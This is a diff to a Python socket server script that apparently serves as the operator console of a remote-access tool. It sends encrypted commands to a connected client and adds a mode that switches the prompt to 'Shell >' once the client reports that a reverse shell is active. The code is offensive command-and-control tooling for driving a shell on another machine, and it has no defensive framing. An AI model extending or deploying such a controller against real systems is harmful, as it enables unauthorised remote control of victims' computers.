@@ -53,16 +53,26 @@ sock.listen(5)  # listen for client connection. The number stands for: number of
 conn, addr = sock.accept()  # Establish connection with client. conn: new socket object used to send and receive data. addr address bound to the socket of the client.
 print('Got connection from', addr)
 
+reverse_shell = False
 
 while True:
-    inpt = input("Enter command:")
+    if reverse_shell:
+        inpt = input("Shell >")
+    else:
+        inpt = input("Enter command:")
     conn.sendall(encryption(inpt))
     recv = decryption(conn.recv(1024))  #Data recieved from the socket. 1024 is the maximum amount of data to be received at once
     if recv:
         recv = str(recv)[2:-1]
-        if(recv == "terminated"):
+        if recv == "terminated":
             print("Terminated client. Good bye!")
             break
+        elif recv == "reverse shell activated":
+            reverse_shell = True
+        elif recv == "reverse shell deactivated":
+            reverse_shell = False
+        elif recv == "received":
+            pass
         else:
             print(recv)
 
